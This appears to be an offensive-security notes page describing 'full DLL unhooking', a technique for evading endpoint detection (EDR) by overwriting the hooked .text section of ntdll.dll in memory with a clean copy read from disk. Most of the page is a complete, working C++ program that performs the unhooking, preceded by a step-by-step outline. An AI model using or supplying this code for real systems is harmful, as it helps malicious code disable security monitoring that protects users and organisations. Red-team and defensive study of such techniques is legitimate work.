---
description: EDR evasion
---

# Full DLL Unhooking with C++

It's possible to completely unhook any given DLL loaded in memory, by reading the .text section of ntdll.dll from disk and putting it on top of the .text section of the ntdll.dll that is mapped in memory. This may help in evading some EDR solutions that rely on userland API hooking.

## Overview

The process for unhooking a DLL is as follows. Let's assume that the  ntdll.dll is hooked and here is how we could unhook it:

1. Map a fresh copy of ntdll.dll from disk to process memory
2. Find virtual address of the .text section of the hooked ntdll.dll
   1. get ntdll.dll base address
   2. module base address + module's .text section VirtualAddress
3. Find virtual address of the .text section of the freshly mapped ntdll.dll
4. Get original memory protections of the hooked module's .text section
5. Copy .text section from the freshly mapped dll to the virtual address \(found in step 3\) of the original \(hooked\) ntdll.dll - this is the meat of the unhooking as all hooked bytes get overwritten with fresh ones from the disk
6. Apply original memory protections to the freshly unhooked .text section of the original ntdll.dll

Below is a simplified graph, illustrating the core concept of the technique, where a hooked .text section of ntdll.dll is replaced with a clean copy of .text section of ntdll.dll from disk:

![](../../.gitbook/assets/image%20%28709%29.png)

## Code

Below code fully unhooks the ntdll.dll, although it could be modified to unhook any other DLL.

```cpp
#include "pch.h"
#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <psapi.h>

int main()
{
	HANDLE process = GetCurrentProcess();
	MODULEINFO mi = {};
	HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");
	
	GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
	LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
	HANDLE ntdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);

	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
		
		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
			DWORD oldProtection = 0;
			bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
			memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
			isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
		}
	}
	
	CloseHandle(process);
	CloseHandle(ntdllFile);
	CloseHandle(ntdllMapping);
	FreeLibrary(ntdllModule);
	
	return 0;
}
```

{% hint style="warning" %}
Note that the above code does not fix image base relocations. Although ntdll.dll does not have anything to be relocated within its .text section, it may be required when dealing with other dlls.

Thanks [@mrgretzky](https://twitter.com/mrgretzky) for highlighting [this](https://twitter.com/mrgretzky/status/1271348438421159936).

See my notes about PE image relocations: [https://ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations\#relocation](https://ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations#relocation)
{% endhint %}

